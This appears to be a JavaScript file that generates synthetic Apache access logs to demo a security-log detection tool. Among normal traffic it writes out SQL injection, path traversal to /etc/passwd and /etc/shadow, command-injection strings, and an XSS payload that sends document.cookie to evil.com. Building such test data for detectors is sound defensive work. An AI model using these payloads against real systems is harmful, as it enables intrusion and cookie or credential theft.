// Realistic Apache Combined Log Format sample data
// Contains all attack types needed to demonstrate CERTify's full detection capabilities
// Generates ~300+ entries covering normal traffic + all attack patterns

const now = new Date('2024-01-15T02:00:00Z')

function ts(offsetSeconds) {
  return new Date(now.getTime() + offsetSeconds * 1000)
    .toISOString()
    .replace('T', ' ')
    .replace('.000Z', ' +0000')
    .replace(/(\d{4})-(\d{2})-(\d{2})/, (_, y, m, d) => `${d}/Jan/${y}`)
    // Convert ISO to CLF format: DD/Mon/YYYY:HH:MM:SS +0000
}

// CLF timestamp: dd/Mon/yyyy:HH:MM:SS +0000
function clf(offsetSeconds) {
  const d = new Date(now.getTime() + offsetSeconds * 1000)
  const day = String(d.getUTCDate()).padStart(2, '0')
  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']
  const mon = months[d.getUTCMonth()]
  const year = d.getUTCFullYear()
  const hh = String(d.getUTCHours()).padStart(2, '0')
  const mm = String(d.getUTCMinutes()).padStart(2, '0')
  const ss = String(d.getUTCSeconds()).padStart(2, '0')
  return `${day}/${mon}/${year}:${hh}:${mm}:${ss} +0000`
}

// Build a log line in Apache Combined Log Format
function line(ip, offsetSec, method, path, status, size, ua, ref = '-') {
  return `${ip} - - [${clf(offsetSec)}] "${method} ${path} HTTP/1.1" ${status} ${size} "${ref}" "${ua}"`
}

const NORMAL_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
const FIREFOX_UA = 'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
const MOBILE_UA = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
const SQLMAP_UA = 'sqlmap/1.7.9#stable (https://sqlmap.org)'
const NIKTO_UA = 'Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)'
const GOBUSTER_UA = 'gobuster/3.6'

// NORMAL IPs (establish baseline — many unique IPs, 2xx status)
const normalIPs = [
  '103.12.45.67', '106.51.22.88', '117.96.230.21', '122.167.41.55', '106.79.20.14',
  '49.207.134.22', '103.244.133.55', '117.55.234.78', '182.73.120.34', '59.144.0.99',
  '223.186.41.56', '115.240.29.133', '1.22.33.44', '27.6.254.32', '182.71.99.2',
  '14.139.125.15', '202.88.16.18', '61.246.223.1', '203.192.246.10', '125.17.147.32',
]

// ATTACKER IPs
const SQLI_IP_1 = '185.220.101.45'       // Russia — SQLi attacker
const SQLI_IP_2 = '45.142.212.100'       // Netherlands  
const PATH_TRAV_IP = '91.108.4.15'       // Germany — path traversal
const XSS_IP = '194.165.16.11'           // Moldova — XSS
const SCANNER_IP_1 = '162.142.125.12'    // US — sqlmap scanner
const SCANNER_IP_2 = '80.82.77.39'       // Netherlands — nikto
const GOBUSTER_IP = '193.32.162.15'      // Russia — gobuster
const HONEYPOT_IP = '77.91.77.6'         // Russia — hitting decoy endpoints
const BRUTE_FORCE_IP = '45.33.32.156'    // US — high volume brute force
// Distributed attack IPs (many IPs → /login)
const DIST_IPS = Array.from({ length: 30 }, (_, i) => `198.51.100.${i + 1}`)
// Sequential IP range scan
const SEQ_IPS = Array.from({ length: 8 }, (_, i) => `203.0.113.${i + 1}`)
// Geo-velocity pair: Mumbai (India) → Moscow (Russia) in 2 seconds
const MUMBAI_IP = '103.26.228.15'        // Maps to Mumbai in mockGeoData
const MOSCOW_IP = '95.213.192.120'       // Maps to Moscow in mockGeoData

const lines = []
let t = 0

// ─── NORMAL TRAFFIC (establish baseline) ───────────────────────────────
for (let i = 0; i < 20; i++) {
  const ip = normalIPs[i % normalIPs.length]
  const ua = i % 3 === 0 ? FIREFOX_UA : i % 3 === 1 ? MOBILE_UA : NORMAL_UA
  lines.push(line(ip, t, 'GET', '/', 200, 1234, ua))
  lines.push(line(ip, t + 1, 'GET', '/index.html', 200, 4567, ua))
  lines.push(line(ip, t + 2, 'GET', '/about', 200, 2341, ua))
  lines.push(line(ip, t + 3, 'GET', '/contact', 200, 1876, ua))
  lines.push(line(ip, t + 4, 'GET', '/products', 200, 8923, ua))
  lines.push(line(ip, t + 5, 'GET', '/blog', 200, 5432, ua))
  lines.push(line(ip, t + 6, 'GET', '/static/main.css', 200, 23456, ua))
  lines.push(line(ip, t + 7, 'GET', '/static/app.js', 200, 89234, ua))
  t += 10
}

// ─── SQL INJECTION ATTACKS ─────────────────────────────────────────────
t = 300
lines.push(line(SQLI_IP_1, t, 'GET', "/login?username=admin'--", 403, 512, NORMAL_UA))
lines.push(line(SQLI_IP_1, t+2, 'GET', "/login?id=1 UNION SELECT username,password FROM users--", 403, 512, NORMAL_UA))
lines.push(line(SQLI_IP_1, t+4, 'GET', "/search?q=1' OR '1'='1", 200, 4523, NORMAL_UA))
lines.push(line(SQLI_IP_1, t+6, 'GET', "/api/users?id=1; DROP TABLE users--", 403, 512, NORMAL_UA))
lines.push(line(SQLI_IP_1, t+8, 'GET', "/page?id=1 AND SLEEP(5)--", 200, 512, NORMAL_UA))
lines.push(line(SQLI_IP_2, t+12, 'POST', '/api/login', 401, 256, NORMAL_UA))
lines.push(line(SQLI_IP_2, t+14, 'GET', '/api/data?sort=name+OR+1=1; xp_cmdshell(dir)--', 500, 512, NORMAL_UA))
lines.push(line(SQLI_IP_2, t+16, 'GET', "/search?q=' UNION SELECT BENCHMARK(1000000,MD5(1))--", 403, 512, NORMAL_UA))

// ─── PATH TRAVERSAL ────────────────────────────────────────────────────
t = 500
lines.push(line(PATH_TRAV_IP, t, 'GET', '/download?file=../../../etc/passwd', 403, 256, NORMAL_UA))
lines.push(line(PATH_TRAV_IP, t+2, 'GET', '/include?page=../../etc/shadow', 404, 256, NORMAL_UA))
lines.push(line(PATH_TRAV_IP, t+4, 'GET', '/getfile?path=..%2F..%2F..%2Fetc%2Fpasswd', 403, 256, NORMAL_UA))
lines.push(line(PATH_TRAV_IP, t+6, 'GET', '/read?f=....//....//etc/passwd', 404, 256, NORMAL_UA))
lines.push(line(PATH_TRAV_IP, t+8, 'GET', '/file?name=/windows/system32/config/SAM', 404, 256, NORMAL_UA))

// ─── XSS ATTACKS ──────────────────────────────────────────────────────
t = 700
lines.push(line(XSS_IP, t, 'GET', '/search?q=<script>alert(document.cookie)</script>', 200, 3421, NORMAL_UA))
lines.push(line(XSS_IP, t+2, 'GET', '/comment?text=<img src=x onerror=alert(1)>', 200, 1234, NORMAL_UA))
lines.push(line(XSS_IP, t+4, 'POST', '/feedback', 200, 512, NORMAL_UA))
lines.push(line(XSS_IP, t+6, 'GET', '/profile?name=<script>document.location=\'http://evil.com?c=\'+document.cookie</script>', 200, 2341, NORMAL_UA))

// ─── SCANNER / AUTOMATED TOOLS ────────────────────────────────────────
t = 900
for (let i = 0; i < 15; i++) {
  lines.push(line(SCANNER_IP_1, t + i*2, 'GET', `/api/v${i}/users`, i < 5 ? 404 : 200, 512, SQLMAP_UA))
}
lines.push(line(SCANNER_IP_1, t+32, 'GET', '/api/admin', 403, 512, SQLMAP_UA))
lines.push(line(SCANNER_IP_1, t+34, 'GET', "/api/users?id=1 UNION SELECT 1,2,3--", 500, 512, SQLMAP_UA))

for (let i = 0; i < 10; i++) {
  lines.push(line(SCANNER_IP_2, t + 60 + i*3, 'GET', ['/cgi-bin/test.cgi','/cgi-bin/printenv','/cgi-bin/php.cgi','/test.php','/admin.php','/upload.php','/shell.php','/config.php','/backup.php','/install.php'][i], 404, 256, NIKTO_UA))
}

// Gobuster scan
for (let i = 0; i < 20; i++) {
  const paths = ['/admin','/api','/backup','/config','/dashboard','/db','/debug','/dev','/env','/files','/hidden','/internal','/logs','/management','/metrics','/monitor','/portal','/private','/secret','/test']
  lines.push(line(GOBUSTER_IP, t + 120 + i*1, 'GET', paths[i], i < 10 ? 404 : 403, 256, GOBUSTER_UA))
}

// ─── HONEYPOT / DECOY ENDPOINTS ───────────────────────────────────────
t = 1400
lines.push(line(HONEYPOT_IP, t, 'GET', '/.env', 403, 512, NORMAL_UA))
lines.push(line(HONEYPOT_IP, t+5, 'GET', '/.git/config', 403, 512, NORMAL_UA))
lines.push(line(HONEYPOT_IP, t+10, 'GET', '/wp-login.php', 404, 512, NORMAL_UA))
lines.push(line(HONEYPOT_IP, t+15, 'GET', '/phpMyAdmin', 404, 512, NORMAL_UA))
lines.push(line(HONEYPOT_IP, t+20, 'GET', '/.htaccess', 403, 512, NORMAL_UA))
lines.push(line(HONEYPOT_IP, t+25, 'GET', '/actuator/env', 404, 512, NORMAL_UA))
lines.push(line(SQLI_IP_1, t+30, 'GET', '/backup.sql', 404, 512, NORMAL_UA))
lines.push(line(SCANNER_IP_2, t+35, 'GET', '/wp-admin', 301, 512, NIKTO_UA))

// ─── HIGH VOLUME BRUTE FORCE ──────────────────────────────────────────
t = 1600
for (let i = 0; i < 600; i++) {
  lines.push(line(BRUTE_FORCE_IP, t + i, 'POST', '/login', i % 50 === 49 ? 200 : 401, 256, NORMAL_UA))
}

// ─── DISTRIBUTED ATTACK (many IPs → /login) — Diversity Rate > 0.8 ──
t = 2300
for (let i = 0; i < 30; i++) {
  lines.push(line(DIST_IPS[i], t + i, 'POST', '/login', 401, 256, NORMAL_UA))
}
// Some extra requests from same IPs to reduce diversity to realistic level
for (let i = 0; i < 5; i++) {
  lines.push(line(DIST_IPS[i], t + 32 + i, 'POST', '/login', 401, 256, NORMAL_UA))
}

// ─── SEQUENTIAL IP RANGE SCAN ─────────────────────────────────────────
t = 2600
for (let i = 0; i < 8; i++) {
  lines.push(line(SEQ_IPS[i], t + i*2, 'GET', '/admin', 403, 256, NORMAL_UA))
  lines.push(line(SEQ_IPS[i], t + i*2 + 1, 'GET', '/', 200, 1234, NORMAL_UA))
}

// ─── COMMAND INJECTION ────────────────────────────────────────────────
t = 2800
lines.push(line(XSS_IP, t, 'GET', '/api/ping?host=127.0.0.1; ls -la', 200, 512, NORMAL_UA))
lines.push(line(SQLI_IP_1, t+5, 'GET', '/api/exec?cmd=|whoami', 403, 256, NORMAL_UA))
lines.push(line(PATH_TRAV_IP, t+10, 'GET', '/utils/run?q=$(cat /etc/passwd)', 403, 256, NORMAL_UA))

// ─── GEO-VELOCITY ANOMALY — Mumbai → Moscow in 2 seconds ─────────────
t = 3000
// Mumbai IP hits /api/transfer at t=3000
lines.push(line(MUMBAI_IP, t, 'GET', '/api/transfer?amount=50000', 200, 1024, NORMAL_UA))
// Moscow IP hits same endpoint 2 seconds later — physically impossible single user
lines.push(line(MOSCOW_IP, t+2, 'GET', '/api/transfer?amount=50000', 200, 1024, NORMAL_UA))

// More normal traffic at end
t = 3200
for (let i = 0; i < 10; i++) {
  const ip = normalIPs[i % normalIPs.length]
  lines.push(line(ip, t + i*3, 'GET', '/', 200, 1234, NORMAL_UA))
  lines.push(line(ip, t + i*3 + 1, 'GET', '/products', 200, 4567, FIREFOX_UA))
}

export const SAMPLE_LOG = lines.join('\n')

export const SAMPLE_FILENAME = 'demo_server_access.log'
